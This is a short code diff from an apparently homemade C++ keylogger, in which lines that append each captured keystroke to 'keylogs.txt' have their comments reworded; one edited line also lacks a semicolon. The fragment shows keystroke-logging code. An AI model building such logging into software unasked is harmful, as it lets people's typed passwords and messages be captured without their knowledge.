@@ -56,8 +56,8 @@ int main()
                 cout << key;
                 ofstream logfile;
                 logfile.open("keylogs.txt", fstream::app);
-                logfile << key; //write the key logs to a file
-                logfile.close() //close the stream
+                logfile << key; //write the key strikes in a file
+                logfile.close() //closes the log
             }
         }
     }
